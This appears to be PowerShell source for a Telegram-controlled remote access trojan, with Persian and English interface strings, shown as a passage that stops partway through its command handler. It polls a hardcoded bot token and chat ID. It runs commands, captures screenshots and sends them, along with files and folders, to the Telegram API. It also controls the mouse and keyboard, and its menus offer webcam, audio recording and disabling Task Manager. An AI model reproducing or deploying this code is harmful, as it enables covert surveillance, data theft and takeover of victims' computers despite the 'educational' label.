# Remote Control PowerShell Script (Converted from Python with Inline Buttons)
# For educational purposes only

$BOT_TOKEN = "8471022586:AAEvm-9YLm_x2fATjVOL7_vCfn4YTotEH_c" # توکن خودت
$CHAT_ID = "7645737658" # Chat ID خودت
$PASSWORD_HASH = "6f8c31653fa8345f2929c2c0e6f2a62c" # MD5 hash of "hacker123"
$API_URL = "https://api.telegram.org/bot$BOT_TOKEN"
$LogPath = Join-Path $env:TEMP "bot.log"
$CURRENT_LANG = "fa"

# Define mouse_event function
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mouse {
    [DllImport("user32.dll")]
    public static extern void mouse_event(uint dwFlags, uint dx, uint dy, int dwData, int dwExtraInfo);
}
"@

function Write-Log {
    param($Message, $Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp - $Level - $Message" | Out-File -FilePath $LogPath -Append -Encoding UTF8
}

function Get-MD5Hash {
    param($String)
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($String)
    $hashBytes = $md5.ComputeHash($bytes)
    $hashString = [BitConverter]::ToString($hashBytes).Replace("-", "").ToLower()
    return $hashString
}

function Send-TelegramMessage {
    param($Text, $ReplyMarkup = $null)
    try {
        $Params = @{
            chat_id = $CHAT_ID
            text = $Text
            parse_mode = "HTML"
        }
        if ($ReplyMarkup) {
            $Params.reply_markup = ($ReplyMarkup | ConvertTo-Json -Compress -Depth 3)
        }
        Invoke-RestMethod -Uri "$API_URL/sendMessage" -Method Post -Body $Params -ErrorAction Stop
        Write-Log "Message sent: $Text"
        Write-Host "Message sent: $Text"
    } catch {
        $ErrorMessage = "Error sending message: {0}" -f $_.ToString()
        Write-Log $ErrorMessage "ERROR"
        Write-Host $ErrorMessage
    }
}

function Send-TelegramFile {
    param($FilePath, $Caption = "", $Type = "photo")
    try {
        if (-not (Test-Path $FilePath)) {
            throw "File not found: $FilePath"
        }
        $Form = @{
            chat_id = $CHAT_ID
            caption = $Caption
        }
        if ($Type -eq "photo") {
            $Form.photo = Get-Item $FilePath
            $Uri = "$API_URL/sendPhoto"
        } else {
            $Form.document = Get-Item $FilePath
            $Uri = "$API_URL/sendDocument"
        }
        Invoke-RestMethod -Uri $Uri -Method Post -Form $Form -ErrorAction Stop
        Write-Log "File sent: $FilePath"
        Write-Host "File sent: $FilePath"
    } catch {
        $ErrorMessage = "Error sending file: {0}" -f $_.ToString()
        Write-Log $ErrorMessage "ERROR"
        Write-Host $ErrorMessage
    }
}

function Take-Screenshot {
    param($OutputPath = (Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"))
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $Screen.Size)
        $Bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        Write-Log "Screenshot saved to: $OutputPath"
        Write-Host "Screenshot saved to: $OutputPath"
        return $OutputPath
    } catch {
        $ErrorMessage = "Error taking screenshot: {0}" -f $_.ToString()
        Write-Log $ErrorMessage "ERROR"
        Write-Host $ErrorMessage
        return $null
    }
}

function Take-RandomScreenshot {
    param($OutputPath = (Join-Path $env:TEMP "random_screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"))
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Width = 300
        $Height = 300
        $X = Get-Random -Minimum 0 -Maximum ($Screen.Width - $Width)
        $Y = Get-Random -Minimum 0 -Maximum ($Screen.Height - $Height)
        $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($X, $Y, 0, 0, $Bitmap.Size)
        $Bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        Write-Log "Random screenshot saved to: $OutputPath at ($X, $Y)"
        Write-Host "Random screenshot saved to: $OutputPath at ($X, $Y)"
        return $OutputPath
    } catch {
        $ErrorMessage = "Error taking random screenshot: {0}" -f $_.ToString()
        Write-Log $ErrorMessage "ERROR"
        Write-Host $ErrorMessage
        return $null
    }
}

function Get-SystemInfo {
    try {
        $OS = Get-CimInstance Win32_OperatingSystem
        $CPU = Get-CimInstance Win32_Processor
        $Memory = Get-CimInstance Win32_ComputerSystem
        $Disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
        $Info = @"
$($LANGUAGES[$CURRENT_LANG]["system_info_title"])
سیستم‌عامل: $($OS.Caption) $($OS.Version)
پردازنده: $($CPU.Name)
حافظه: $([math]::Round($Memory.TotalPhysicalMemory / 1GB, 1)) گیگابایت
دیسک: $([math]::Round(($Disk.Size - $Disk.FreeSpace) / 1GB, 1)) از $([math]::Round($Disk.Size / 1GB, 1)) گیگابایت استفاده‌شده
"@
        return $Info
    } catch {
        $ErrorMessage = "Error retrieving system info: {0}" -f $_.ToString()
        Write-Log $ErrorMessage "ERROR"
        Write-Host $ErrorMessage
        return "خطا در دریافت اطلاعات سیستم: {0}" -f $_.ToString()
    }
}

# Language dictionary (fixed duplicates)
$LANGUAGES = @{
    "en" = @{
        "welcome" = "<b>Hacker Control Activated!</b>`nChoose an action:"
        "updating" = "Bot is updating, please be patient..."
        "menu" = "Choose an action:"
        "open_app" = "Open App"
        "close_app" = "Close App"
        "processes" = "List Processes"
        "cmd" = "Run Command"
        "screenshot" = "Take Screenshot"
        "random_screenshot" = "Random Screenshot"
        "multi_screenshot" = "Multiple Screenshots"
        "shutdown" = "Shutdown PC"
        "restart" = "Restart PC"
        "sleep" = "Sleep PC"
        "hibernate" = "Hibernate PC"
        "lock" = "Lock Screen"
        "language" = "Change Language"
        "mouse_control" = "Mouse Control"
        "keyboard_control" = "Keyboard Control"
        "system_info" = "System Info"
        "file_manager" = "File Manager"
        "record_audio" = "Record Audio"
        "webcam" = "Webcam Control"
        "wifi_list" = "<b>WiFi Networks:</b>`n{0}"
        "port_scan" = "Scan Open Ports"
        "popup_message" = "Show Pop-up Message"
        "zip_folder" = "Zip & Download Folder"
        "brightness_control" = "Brightness Control"
        "system_files" = "Download System Files"
        "run_script" = "Run Script"
        "disable_taskmgr" = "Disable Task Manager"
        "ping" = "Ping Bot"
        "lang_en" = "English"
        "lang_fa" = "فارسی"
        "usage_open" = "❌ Please enter app name (e.g., notepad)"
        "opened" = "✅ Opened: {0}"
        "error_open" = "❌ Error opening {0}: {1}"
        "usage_close" = "❌ Please enter app name (e.g., chrome)"
        "closed" = "✅ Closed: {0}"
        "error_close" = "❌ Error closing {0}: {1}"
        "processes_title" = "<b>Top Processes:</b>"
        "error_processes" = "❌ Error: {0}"
        "usage_cmd" = "❌ Please enter command (e.g., dir C:\\)"
        "cmd_output" = "<pre>{0}</pre>"
        "error_cmd" = "❌ Command error: {0}"
        "screenshot_sent" = "📸 Screenshot sent!"
        "error_screenshot" = "❌ Screenshot error: {0}"
        "random_screenshot_sent" = "📸 Random screenshot sent!"
        "usage_multi_screenshot" = "❌ Enter number of screenshots and delay (e.g., 3,1 for 3 shots with 1s delay)"
        "multi_screenshot_sent" = "📸 Multiple screenshots sent!"
        "shutting_down" = "🔴 Shutting down in 5 seconds... Enter password:"
        "restarting" = "🔄 Restarting in 5 seconds... Enter password:"
        "sleeping" = "💤 PC entering sleep mode... Enter password:"
        "hibernating" = "🛌 PC entering hibernate mode... Enter password:"
        "locked" = "🔒 Screen locked!"
        "mouse_move" = "Move Mouse"
        "mouse_click" = "Click Mouse"
        "mouse_multi_click" = "Multiple Clicks"
        "mouse_scroll" = "Scroll"
        "usage_mouse_move" = "❌ Enter X,Y coordinates (e.g., 100,200)"
        "usage_mouse_click" = "❌ Enter 'left' or 'right' for click"
        "usage_mouse_multi_click" = "❌ Enter click type and count (e.g., left,3 for 3 left clicks)"
        "usage_mouse_scroll" = "❌ Enter scroll amount (e.g., 10 or -10)"
        "mouse_moved" = "✅ Mouse moved to ({0},{1})"
        "mouse_clicked" = "✅ Clicked: {0}"
        "mouse_multi_clicked" = "✅ Multi-clicked: {0} x{1}"
        "mouse_scrolled" = "✅ Scrolled: {0}"
        "keyboard_type" = "Type Text"
        "keyboard_press" = "Press Key"
        "usage_keyboard_type" = "❌ Enter text to type"
        "usage_keyboard_press" = "❌ Enter key (e.g., enter, alt+tab)"
        "keyboard_typed" = "✅ Typed: {0}"
        "keyboard_pressed" = "✅ Pressed: {0}"
        "system_info_title" = "<b>System Info:</b>"
        "file_list" = "List Files"
        "file_download" = "Download File"
        "file_upload" = "Upload File"
        "usage_file_list" = "❌ Enter directory path (e.g., C:\\Users\\Kerman Computer\\Desktop)"
        "usage_file_download" = "❌ Enter file path to download"
        "file_listed" = "<b>Files:</b>`n{0}"
        "file_downloaded" = "✅ File sent: {0}"
        "file_uploaded" = "✅ File saved to: {0}"
        "error_file" = "❌ File error: {0}"
        "usage_record_audio" = "❌ Enter duration in seconds (e.g., 5)"
        "error_audio" = "❌ Audio error: {0}"
        "webcam_photo" = "Take Photo"
        "webcam_video" = "Record Video"
        "usage_webcam_video" = "❌ Enter video duration in seconds (e.g., 10)"
        "error_webcam" = "❌ Webcam error: {0}"
        "error_wifi" = "❌ WiFi error: {0}"
        "wifi_off_message" = "✅ WiFi turned off!" # Changed key to avoid conflict
        "error_wifi_off" = "❌ WiFi turn off error: {0}"
        "system_files_menu" = "System Files Menu"
        "download_hosts" = "Download hosts File"
        "download_system_ini" = "Download system.ini"
        "system_files_sent" = "✅ System file sent: {0}"
        "error_system_files" = "❌ System file error: {0}"
        "usage_port_scan" = "❌ Enter ports to scan (e.g., 80,443,8080)"
        "port_scan_result" = "<b>Open Ports:</b>`n{0}"
        "error_port_scan" = "❌ Port scan error: {0}"
        "usage_popup" = "❌ Enter message for pop-up"
        "popup_sent" = "✅ Pop-up message displayed: {0}"
        "usage_zip_folder" = "❌ Enter folder path and file types (e.g., C:\\Users\\Kerman Computer\\Desktop\\MyFolder,.txt,.jpg)"
        "zip_folder_sent" = "✅ Zipped folder sent: {0}"
        "error_zip_folder" = "❌ Zip folder error: {0}"
        "usage_brightness" = "❌ Enter brightness level (0-100)"
        "brightness_set" = "✅ Brightness set to {0}%"
        "usage_run_script" = "❌ Enter commands (one per line, e.g., dir C:\\`nnotepad)"
        "script_executed" = "✅ Script executed:`n{0}"
        "error_script" = "❌ Script error: {0}"
        "taskmgr_disabled" = "✅ Task Manager disabled!"
        "error_taskmgr" = "❌ Task Manager error: {0}"
        "ping_response" = "✅ Bot is online!"
    }
    "fa" = @{
        "welcome" = "<b>کنترل هکری فعال شد!</b>`nیک عملیات انتخاب کنید:"
        "updating" = "ربات در حال آپدیت است، لطفاً صبور باشید..."
        "menu" = "یک عملیات انتخاب کنید:"
        "open_app" = "باز کردن برنامه"
        "close_app" = "بستن برنامه"
        "processes" = "لیست فرآیندها"
        "cmd" = "اجرای دستور"
        "screenshot" = "گرفتن اسکرین‌شات"
        "random_screenshot" = "اسکرین‌شات تصادفی"
        "multi_screenshot" = "اسکرین‌شات‌های چندگانه"
        "shutdown" = "خاموش کردن سیستم"
        "restart" = "ری‌استارت سیستم"
        "sleep" = "حالت خواب سیستم"
        "hibernate" = "حالت هایبرنیت سیستم"
        "lock" = "قفل صفحه"
        "language" = "تغییر زبان"
        "mouse_control" = "کنترل موس"
        "keyboard_control" = "کنترل کیبورد"
        "system_info" = "اطلاعات سیستم"
        "file_manager" = "مدیریت فایل"
        "record_audio" = "ضبط صدا"
        "webcam" = "کنترل وب‌کم"
        "wifi_list" = "<b>وای‌فای‌ها:</b>`n{0}"
        "port_scan" = "اسکن پورت‌های باز"
        "popup_message" = "نمایش پیام پاپ‌آپ"
        "zip_folder" = "فشرده‌سازی و دانلود پوشه"
        "brightness_control" = "کنترل نور صفحه"
        "system_files" = "دانلود فایل‌های سیستمی"
        "run_script" = "اجرای اسکریپت"
        "disable_taskmgr" = "غیرفعال کردن Task Manager"
        "ping" = "پینگ بات"
        "lang_en" = "انگلیسی"
        "lang_fa" = "فارسی"
        "usage_open" = "❌ لطفاً نام برنامه را وارد کنید (مثال: notepad)"
        "opened" = "✅ باز شد: {0}"
        "error_open" = "❌ خطا در باز کردن {0}: {1}"
        "usage_close" = "❌ لطفاً نام برنامه را وارد کنید (مثال: chrome)"
        "closed" = "✅ بسته شد: {0}"
        "error_close" = "❌ خطا در بستن {0}: {1}"
        "processes_title" = "<b>فرآیندهای برتر:</b>"
        "error_processes" = "❌ خطا: {0}"
        "usage_cmd" = "❌ لطفاً دستور را وارد کنید (مثال: dir C:\\)"
        "cmd_output" = "<pre>{0}</pre>"
        "error_cmd" = "❌ خطا در اجرای دستور: {0}"
        "screenshot_sent" = "📸 اسکرین‌شات ارسال شد!"
        "error_screenshot" = "❌ خطا در اسکرین‌شات: {0}"
        "random_screenshot_sent" = "📸 اسکرین‌شات تصادفی ارسال شد!"
        "usage_multi_screenshot" = "❌ تعداد اسکرین‌شات و تأخیر را وارد کنید (مثال: 3,1 برای 3 عکس با تأخیر 1 ثانیه)"
        "multi_screenshot_sent" = "📸 اسکرین‌شات‌های چندگانه ارسال شد!"
        "shutting_down" = "🔴 خاموش شدن سیستم در 5 ثانیه... رمز را وارد کنید:"
        "restarting" = "🔄 ری‌استارت سیستم در 5 ثانیه... رمز را وارد کنید:"
        "sleeping" = "💤 سیستم در حالت خواب... رمز را وارد کنید:"
        "hibernating" = "🛌 سیستم در حالت هایبرنیت... رمز را وارد کنید:"
        "locked" = "🔒 صفحه قفل شد!"
        "mouse_move" = "حرکت موس"
        "mouse_click" = "کلیک موس"
        "mouse_multi_click" = "کلیک‌های چندگانه"
        "mouse_scroll" = "اسکرول"
        "usage_mouse_move" = "❌ مختصات X,Y را وارد کنید (مثال: 100,200)"
        "usage_mouse_click" = "❌ برای کلیک 'left' یا 'right' را وارد کنید"
        "usage_mouse_multi_click" = "❌ نوع کلیک و تعداد را وارد کنید (مثال: left,3 برای 3 کلیک چپ)"
        "usage_mouse_scroll" = "❌ مقدار اسکرول را وارد کنید (مثال: 10 یا -10)"
        "mouse_moved" = "✅ موس به ({0},{1}) حرکت کرد"
        "mouse_clicked" = "✅ کلیک شد: {0}"
        "mouse_multi_clicked" = "✅ کلیک چندگانه: {0} x{1}"
        "mouse_scrolled" = "✅ اسکرول شد: {0}"
        "keyboard_type" = "تایپ متن"
        "keyboard_press" = "فشار دادن کلید"
        "usage_keyboard_type" = "❌ متن برای تایپ را وارد کنید"
        "usage_keyboard_press" = "❌ کلید را وارد کنید (مثل: enter یا alt+tab)"
        "keyboard_typed" = "✅ تایپ شد: {0}"
        "keyboard_pressed" = "✅ فشرده شد: {0}"
        "system_info_title" = "<b>اطلاعات سیستم:</b>"
        "file_list" = "لیست فایل‌ها"
        "file_download" = "دانلود فایل"
        "file_upload" = "آپلود فایل"
        "usage_file_list" = "❌ مسیر پوشه را وارد کنید (مثال: C:\\Users\\Kerman Computer\\Desktop)"
        "usage_file_download" = "❌ مسیر فایل برای دانلود را وارد کنید"
        "file_listed" = "<b>فایل‌ها:</b>`n{0}"
        "file_downloaded" = "✅ فایل ارسال شد: {0}"
        "file_uploaded" = "✅ فایل ذخیره شد در: {0}"
        "error_file" = "❌ خطا در فایل: {0}"
        "usage_record_audio" = "❌ مدت زمان ضبط را به ثانیه وارد کنید (مثل: 5)"
        "error_audio" = "❌ خطا در ضبط صدا: {0}"
        "webcam_photo" = "گرفتن عکس"
        "webcam_video" = "ضبط ویدیو"
        "usage_webcam_video" = "❌ مدت زمان ویدیو را به ثانیه وارد کنید (مثل: 10)"
        "error_webcam" = "❌ خطا در وب‌کم: {0}"
        "error_wifi" = "❌ خطا در وای‌فای: {0}"
        "wifi_off_message" = "✅ وای‌فای خاموش شد!" # Changed key to avoid conflict
        "error_wifi_off" = "❌ خطا در خاموش کردن وای‌فای: {0}"
        "system_files_menu" = "منوی فایل‌های سیستمی"
        "download_hosts" = "دانلود فایل hosts"
        "download_system_ini" = "دانلود فایل system.ini"
        "system_files_sent" = "✅ فایل سیستمی ارسال شد: {0}"
        "error_system_files" = "❌ خطا در فایل سیستمی: {0}"
        "usage_port_scan" = "❌ پورت‌ها را وارد کنید (مثال: 80,443,8080)"
        "port_scan_result" = "<b>پورت‌های باز:</b>`n{0}"
        "error_port_scan" = "❌ خطا در اسکن پورت: {0}"
        "usage_popup" = "❌ پیام برای پاپ‌آپ را وارد کنید"
        "popup_sent" = "✅ پیام پاپ‌آپ نمایش داده شد: {0}"
        "usage_zip_folder" = "❌ مسیر پوشه و نوع فایل‌ها را وارد کنید (مثال: C:\\Users\\Kerman Computer\\Desktop\\MyFolder,.txt,.jpg)"
        "zip_folder_sent" = "✅ پوشه فشرده ارسال شد: {0}"
        "error_zip_folder" = "❌ خطا در فشرده‌سازی پوشه: {0}"
        "usage_brightness" = "❌ سطح روشنایی را وارد کنید (0-100)"
        "brightness_set" = "✅ روشنایی تنظیم شد: {0}%"
        "usage_run_script" = "❌ دستورات را وارد کنید (هر دستور در یک خط، مثال: dir C:\\`nnotepad)"
        "script_executed" = "✅ اسکریپت اجرا شد:`n{0}"
        "error_script" = "❌ خطا در اسکریپت: {0}"
        "taskmgr_disabled" = "✅ Task Manager غیرفعال شد!"
        "error_taskmgr" = "❌ خطا در غیرفعال کردن Task Manager: {0}"
        "ping_response" = "✅ بات آنلاین است!"
    }
}

# Inline Keyboard Menus
$MainMenu = @{
    inline_keyboard = @(
        @(@{text=$LANGUAGES[$CURRENT_LANG]["open_app"]; callback_data="open_app"}, @{text=$LANGUAGES[$CURRENT_LANG]["close_app"]; callback_data="close_app"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["processes"]; callback_data="ps"}, @{text=$LANGUAGES[$CURRENT_LANG]["cmd"]; callback_data="cmd"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["screenshot"]; callback_data="screenshot"}, @{text=$LANGUAGES[$CURRENT_LANG]["random_screenshot"]; callback_data="random_screenshot"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["multi_screenshot"]; callback_data="multi_screenshot"}, @{text=$LANGUAGES[$CURRENT_LANG]["system_info"]; callback_data="system_info"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["mouse_control"]; callback_data="mouse_control"}, @{text=$LANGUAGES[$CURRENT_LANG]["keyboard_control"]; callback_data="keyboard_control"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["file_manager"]; callback_data="file_manager"}, @{text=$LANGUAGES[$CURRENT_LANG]["record_audio"]; callback_data="record_audio"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["webcam"]; callback_data="webcam"}, @{text=$LANGUAGES[$CURRENT_LANG]["wifi_list"]; callback_data="wifi_list"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["port_scan"]; callback_data="port_scan"}, @{text=$LANGUAGES[$CURRENT_LANG]["popup_message"]; callback_data="popup_message"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["zip_folder"]; callback_data="zip_folder"}, @{text=$LANGUAGES[$CURRENT_LANG]["brightness_control"]; callback_data="brightness_control"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["system_files"]; callback_data="system_files"}, @{text=$LANGUAGES[$CURRENT_LANG]["run_script"]; callback_data="run_script"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["disable_taskmgr"]; callback_data="disable_taskmgr"}, @{text=$LANGUAGES[$CURRENT_LANG]["ping"]; callback_data="ping"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["shutdown"]; callback_data="shutdown"}, @{text=$LANGUAGES[$CURRENT_LANG]["restart"]; callback_data="restart"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["sleep"]; callback_data="sleep"}, @{text=$LANGUAGES[$CURRENT_LANG]["hibernate"]; callback_data="hibernate"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["lock"]; callback_data="lock"}, @{text=$LANGUAGES[$CURRENT_LANG]["language"]; callback_data="language"})
    )
}

$MouseMenu = @{
    inline_keyboard = @(
        @(@{text=$LANGUAGES[$CURRENT_LANG]["mouse_move"]; callback_data="mouse_move"}, @{text=$LANGUAGES[$CURRENT_LANG]["mouse_click"]; callback_data="mouse_click"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["mouse_multi_click"]; callback_data="mouse_multi_click"}, @{text=$LANGUAGES[$CURRENT_LANG]["mouse_scroll"]; callback_data="mouse_scroll"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["menu"]; callback_data="main_menu"})
    )
}

$KeyboardMenu = @{
    inline_keyboard = @(
        @(@{text=$LANGUAGES[$CURRENT_LANG]["keyboard_type"]; callback_data="keyboard_type"}, @{text=$LANGUAGES[$CURRENT_LANG]["keyboard_press"]; callback_data="keyboard_press"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["menu"]; callback_data="main_menu"})
    )
}

$FileMenu = @{
    inline_keyboard = @(
        @(@{text=$LANGUAGES[$CURRENT_LANG]["file_list"]; callback_data="file_list"}, @{text=$LANGUAGES[$CURRENT_LANG]["file_download"]; callback_data="file_download"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["file_upload"]; callback_data="file_upload"}, @{text=$LANGUAGES[$CURRENT_LANG]["menu"]; callback_data="main_menu"})
    )
}

$WebcamMenu = @{
    inline_keyboard = @(
        @(@{text=$LANGUAGES[$CURRENT_LANG]["webcam_photo"]; callback_data="webcam_photo"}, @{text=$LANGUAGES[$CURRENT_LANG]["webcam_video"]; callback_data="webcam_video"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["menu"]; callback_data="main_menu"})
    )
}

$SystemFilesMenu = @{
    inline_keyboard = @(
        @(@{text=$LANGUAGES[$CURRENT_LANG]["download_hosts"]; callback_data="download_hosts"}, @{text=$LANGUAGES[$CURRENT_LANG]["download_system_ini"]; callback_data="download_system_ini"}),
        @(@{text=$LANGUAGES[$CURRENT_LANG]["menu"]; callback_data="main_menu"})
    )
}

$LanguageMenu = @{
    inline_keyboard = @(
        @(@{text=$LANGUAGES["en"]["lang_en"]; callback_data="lang_en"}, @{text=$LANGUAGES["fa"]["lang_fa"]; callback_data="lang_fa"})
    )
}

$LastUpdateId = 0
$State = $null
$UserData = @{}

Write-Log "Bot starting..."
Write-Host "🚀 Remote Control PowerShell Bot starting..."

while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$API_URL/getUpdates?offset=$($LastUpdateId + 1)&timeout=30" -ErrorAction Stop
        foreach ($Update in $Updates.result) {
            $LastUpdateId = $Update.update_id
            if ($Update.message.chat.id -ne $CHAT_ID -and $Update.callback_query.message.chat.id -ne $CHAT_ID) {
                Write-Log "Unauthorized access attempt from chat_id: $($Update.message.chat.id)" "WARNING"
                continue
            }

            if ($Update.callback_query) {
                $CallbackData = $Update.callback_query.data
                $MessageId = $Update.callback_query.message.message_id
                $ChatId = $Update.callback_query.message.chat.id

                switch ($CallbackData) {
                    "main_menu" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["menu"]) -ReplyMarkup $MainMenu
                        Write-Log "Main menu displayed"
                    }
                    "language" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["language"]) -ReplyMarkup $LanguageMenu
                        Write-Log "Language menu displayed"
                    }
                    "lang_en" {
                        $CURRENT_LANG = "en"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["menu"]) -ReplyMarkup $MainMenu
                        Write-Log "Language changed to English"
                    }
                    "lang_fa" {
                        $CURRENT_LANG = "fa"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["menu"]) -ReplyMarkup $MainMenu
                        Write-Log "Language changed to Persian"
                    }
                    "open_app" {
                        $State = "open_app"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_open"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting open_app input"
                    }
                    "close_app" {
                        $State = "close_app"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_close"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting close_app input"
                    }
                    "cmd" {
                        $State = "cmd"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_cmd"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting cmd input"
                    }
                    "ps" {
                        try {
                            $Processes = Get-Process | Select-Object -First 10 | Format-Table -Property ProcessName, Id -AutoSize | Out-String
                            Send-TelegramMessage -Text ("$($LANGUAGES[$CURRENT_LANG]["processes_title"])`n<pre>$Processes</pre>") -ReplyMarkup $MainMenu
                            Write-Log "Processes listed"
                        } catch {
                            $ErrorMessage = "Error listing processes: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                    }
                    "screenshot" {
                        try {
                            $ScreenshotPath = Take-Screenshot
                            if ($ScreenshotPath) {
                                Send-TelegramFile -FilePath $ScreenshotPath -Caption "اسکرین‌شات از ویندوز" -Type "photo"
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["screenshot_sent"]) -ReplyMarkup $MainMenu
                                Remove-Item $ScreenshotPath -ErrorAction SilentlyContinue
                                Write-Log "Screenshot sent"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_screenshot"] -f "Failed to capture") -ReplyMarkup $MainMenu
                                Write-Log "Failed to capture screenshot" "ERROR"
                            }
                        } catch {
                            $ErrorMessage = "Error taking screenshot: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_screenshot"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                    }
                    "random_screenshot" {
                        try {
                            $ScreenshotPath = Take-RandomScreenshot
                            if ($ScreenshotPath) {
                                Send-TelegramFile -FilePath $ScreenshotPath -Caption "اسکرین‌شات تصادفی" -Type "photo"
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["random_screenshot_sent"]) -ReplyMarkup $MainMenu
                                Remove-Item $ScreenshotPath -ErrorAction SilentlyContinue
                                Write-Log "Random screenshot sent"
                            } else {
                                Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_screenshot"] -f "Failed to capture") -ReplyMarkup $MainMenu
                                Write-Log "Failed to capture random screenshot" "ERROR"
                            }
                        } catch {
                            $ErrorMessage = "Error taking random screenshot: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_screenshot"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                    }
                    "multi_screenshot" {
                        $State = "multi_screenshot"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_multi_screenshot"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting multi_screenshot input"
                    }
                    {$_ -in @("shutdown", "restart", "sleep", "hibernate")} {
                        $State = $CallbackData
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["$($_)ing"]) -ReplyMarkup $MainMenu
                        Write-Log "Awaiting password for $_"
                    }
                    "lock" {
                        try {
                            Add-Type -Name User32 -Namespace Win32 -MemberDefinition '[DllImport("user32.dll")] public static extern void LockWorkStation();' -PassThru
                            [Win32.User32]::LockWorkStation()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["locked"]) -ReplyMarkup $MainMenu
                            Write-Log "Screen locked"
                        } catch {
                            $ErrorMessage = "Error locking screen: {0}" -f $_.ToString()
                            Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["error_processes"] -f $_.ToString()) -ReplyMarkup $MainMenu
                            Write-Log $ErrorMessage "ERROR"
                        }
                    }
                    "mouse_control" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["mouse_control"]) -ReplyMarkup $MouseMenu
                        Write-Log "Mouse control menu displayed"
                    }
                    "mouse_move" {
                        $State = "mouse_move"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_mouse_move"]) -ReplyMarkup $MouseMenu
                        Write-Log "Awaiting mouse_move input"
                    }
                    "mouse_click" {
                        $State = "mouse_click"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_mouse_click"]) -ReplyMarkup $MouseMenu
                        Write-Log "Awaiting mouse_click input"
                    }
                    "mouse_multi_click" {
                        $State = "mouse_multi_click"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_mouse_multi_click"]) -ReplyMarkup $MouseMenu
                        Write-Log "Awaiting mouse_multi_click input"
                    }
                    "mouse_scroll" {
                        $State = "mouse_scroll"
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["usage_mouse_scroll"]) -ReplyMarkup $MouseMenu
                        Write-Log "Awaiting mouse_scroll input"
                    }
                    "keyboard_control" {
                        Send-TelegramMessage -Text ($LANGUAGES[$CURRENT_LANG]["keyboard_control"]) -ReplyMarkup $KeyboardMenu
                        Write-Log "Keyboard control menu displayed"
                    }
                    "keyboard_type" {
                        $State = "keyboard_type"
